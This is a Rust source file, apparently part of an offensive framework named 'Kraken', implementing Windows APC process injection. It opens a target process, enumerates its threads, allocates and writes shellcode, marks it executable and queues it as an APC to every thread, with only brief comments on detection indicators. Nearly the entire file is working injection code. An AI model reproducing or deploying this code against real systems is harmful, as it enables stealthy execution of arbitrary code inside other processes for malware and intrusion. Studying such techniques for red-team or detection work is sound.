//! Tier 3: APC injection
//!
//! Uses Asynchronous Procedure Calls to execute code in an alertable thread:
//! - Find threads in the target process
//! - Allocate and write shellcode
//! - Queue an APC to execute the shellcode using NtQueueApcThread
//!
//! This technique doesn't create a new thread, making it stealthier but
//! requires finding a thread that will enter an alertable wait state.
//!
//! Detection: Sysmon Event 10, QueueUserAPC call trace, ETW Threat-Intelligence

#[cfg(windows)]
use crate::{handle::OwnedHandle, InjectionResult};
#[cfg(windows)]
use common::KrakenError;

#[cfg(windows)]
use ntapi::ntmmapi::{NtAllocateVirtualMemory, NtProtectVirtualMemory, NtWriteVirtualMemory};
#[cfg(windows)]
use ntapi::winapi::ctypes::c_void as nt_void;
#[cfg(windows)]
use windows_sys::Win32::Foundation::NTSTATUS;
#[cfg(windows)]
use windows_sys::Win32::System::Memory::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ, PAGE_READWRITE};
#[cfg(windows)]
use windows_sys::Win32::System::Threading::{
    OpenProcess, OpenThread, QueueUserAPC, PROCESS_QUERY_INFORMATION, PROCESS_VM_OPERATION,
    PROCESS_VM_WRITE, THREAD_SET_CONTEXT,
};

#[cfg(windows)]
use windows_sys::Win32::System::Diagnostics::ToolHelp::{
    CreateToolhelp32Snapshot, Thread32First, Thread32Next, TH32CS_SNAPTHREAD, THREADENTRY32,
};

/// Check if NTSTATUS indicates success
#[cfg(windows)]
#[inline]
fn nt_success(status: NTSTATUS) -> bool {
    status >= 0
}

/// Find all thread IDs belonging to a process
#[cfg(windows)]
fn enumerate_threads(target_pid: u32) -> Result<Vec<u32>, KrakenError> {
    let snapshot = unsafe { CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0) };
    let snapshot = OwnedHandle::new(snapshot)
        .ok_or_else(|| KrakenError::Module("CreateToolhelp32Snapshot failed".into()))?;

    let mut threads = Vec::new();
    let mut entry = THREADENTRY32 {
        dwSize: std::mem::size_of::<THREADENTRY32>() as u32,
        cntUsage: 0,
        th32ThreadID: 0,
        th32OwnerProcessID: 0,
        tpBasePri: 0,
        tpDeltaPri: 0,
        dwFlags: 0,
    };

    if unsafe { Thread32First(snapshot.as_raw(), &mut entry) } != 0 {
        loop {
            if entry.th32OwnerProcessID == target_pid {
                threads.push(entry.th32ThreadID);
            }

            entry.dwSize = std::mem::size_of::<THREADENTRY32>() as u32;
            if unsafe { Thread32Next(snapshot.as_raw(), &mut entry) } == 0 {
                break;
            }
        }
    }

    if threads.is_empty() {
        return Err(KrakenError::Module("no threads found in target process".into()));
    }

    Ok(threads)
}

/// Inject using APC queuing
///
/// # Arguments
/// * `target_pid` - Process ID of the target
/// * `shellcode` - The shellcode bytes to inject
/// * `wait` - Whether to wait (not applicable for APC - execution depends on thread alertable state)
/// * `timeout_ms` - Timeout in milliseconds (unused for APC injection)
///
/// # Returns
/// * `Ok(InjectionResult)` on success (APC queued)
/// * `Err(KrakenError)` on failure
///
/// # Detection Indicators
/// - QueueUserAPC or NtQueueApcThread call to remote process thread
/// - Cross-process thread handle with THREAD_SET_CONTEXT access
/// - Sysmon Event 10 with thread access
/// - Target thread entering alertable wait state after APC queue
///
/// # Notes
/// APC execution only occurs when the target thread enters an alertable wait state
/// (SleepEx, WaitForSingleObjectEx, etc.). The shellcode must handle this context.
#[cfg(windows)]
pub fn inject(
    target_pid: u32,
    shellcode: &[u8],
    _wait: bool,
    _timeout_ms: u32,
) -> Result<InjectionResult, KrakenError> {
    let access = PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_QUERY_INFORMATION;

    // Open target process
    let proc_handle = unsafe { OpenProcess(access, 0, target_pid) };
    let proc_handle = OwnedHandle::new(proc_handle)
        .ok_or_else(|| KrakenError::Module("failed to open target process".into()))?;

    tracing::debug!(target_pid, "opened target process for APC injection");

    // Enumerate threads in target process
    let threads = enumerate_threads(target_pid)?;
    tracing::debug!(target_pid, thread_count = threads.len(), "enumerated target threads");

    // Allocate memory using NtAllocateVirtualMemory
    let mut base_address: *mut nt_void = std::ptr::null_mut();
    let mut region_size: usize = shellcode.len();

    let status = unsafe {
        NtAllocateVirtualMemory(
            proc_handle.as_raw() as *mut _,
            &mut base_address as *mut *mut nt_void,
            0,
            &mut region_size,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE,
        )
    };

    if !nt_success(status) {
        return Err(KrakenError::Module(format!(
            "NtAllocateVirtualMemory failed: 0x{:08X}",
            status
        )));
    }

    tracing::debug!(
        target_pid,
        addr = ?base_address,
        size = region_size,
        "allocated remote memory for APC"
    );

    // Write shellcode
    let mut bytes_written: usize = 0;
    let status = unsafe {
        NtWriteVirtualMemory(
            proc_handle.as_raw() as *mut _,
            base_address,
            shellcode.as_ptr() as *mut _,
            shellcode.len(),
            &mut bytes_written,
        )
    };

    if !nt_success(status) {
        let mut free_size: usize = 0;
        unsafe {
            ntapi::ntmmapi::NtFreeVirtualMemory(
                proc_handle.as_raw() as *mut _,
                &mut base_address as *mut *mut nt_void,
                &mut free_size,
                windows_sys::Win32::System::Memory::MEM_RELEASE,
            );
        }
        return Err(KrakenError::Module(format!(
            "NtWriteVirtualMemory failed: 0x{:08X}",
            status
        )));
    }

    // Change protection to RX
    let mut protect_size: usize = shellcode.len();
    let mut old_protect: u32 = 0;
    let status = unsafe {
        NtProtectVirtualMemory(
            proc_handle.as_raw() as *mut _,
            &mut base_address as *mut *mut nt_void,
            &mut protect_size,
            PAGE_EXECUTE_READ,
            &mut old_protect,
        )
    };

    if !nt_success(status) {
        let mut free_size: usize = 0;
        unsafe {
            ntapi::ntmmapi::NtFreeVirtualMemory(
                proc_handle.as_raw() as *mut _,
                &mut base_address as *mut *mut nt_void,
                &mut free_size,
                windows_sys::Win32::System::Memory::MEM_RELEASE,
            );
        }
        return Err(KrakenError::Module(format!(
            "NtProtectVirtualMemory failed: 0x{:08X}",
            status
        )));
    }

    tracing::debug!(target_pid, "changed memory protection to RX");

    // Queue APC to each thread (at least one should be alertable)
    let mut apc_queued = false;
    let mut queued_thread_id = 0u32;

    for thread_id in &threads {
        let thread_handle = unsafe { OpenThread(THREAD_SET_CONTEXT, 0, *thread_id) };

        if let Some(th) = OwnedHandle::new(thread_handle) {
            // Queue the APC - execution occurs when thread enters alertable wait
            // SAFETY: base_address points to executable shellcode in target process
            let result = unsafe {
                QueueUserAPC(
                    Some(std::mem::transmute(base_address)),
                    th.as_raw(),
                    0,
                )
            };

            if result != 0 {
                tracing::debug!(target_pid, thread_id, "queued APC to thread");
                apc_queued = true;
                queued_thread_id = *thread_id;
                // Queue to multiple threads for higher success probability
            }
        }
    }

    if !apc_queued {
        let mut free_size: usize = 0;
        unsafe {
            ntapi::ntmmapi::NtFreeVirtualMemory(
                proc_handle.as_raw() as *mut _,
                &mut base_address as *mut *mut nt_void,
                &mut free_size,
                windows_sys::Win32::System::Memory::MEM_RELEASE,
            );
        }
        return Err(KrakenError::Module(
            "failed to queue APC to any thread".into(),
        ));
    }

    tracing::info!(
        target_pid,
        thread_id = queued_thread_id,
        "APC injection queued - awaiting alertable wait state"
    );

    Ok(InjectionResult {
        success: true,
        thread_id: Some(queued_thread_id),
        technique_used: "APC Injection (QueueUserAPC)".to_string(),
        error: None,
    })
}

#[cfg(not(windows))]
pub fn inject(
    _pid: u32,
    _shellcode: &[u8],
    _wait: bool,
    _timeout_ms: u32,
) -> Result<crate::InjectionResult, common::KrakenError> {
    Err(common::KrakenError::Module(
        "APC injection only supported on Windows".into(),
    ))
}

#[cfg(test)]
mod tests {
    use super::*;

    #[cfg(not(windows))]
    #[test]
    fn test_inject_non_windows() {
        let result = inject(1234, &[0x90], false, 0);
        assert!(result.is_err());
        if let Err(common::KrakenError::Module(msg)) = result {
            assert!(msg.contains("only supported on Windows"));
        }
    }

    #[cfg(windows)]
    #[test]
    fn test_nt_success() {
        assert!(nt_success(0));
        assert!(!nt_success(-1));
    }
}
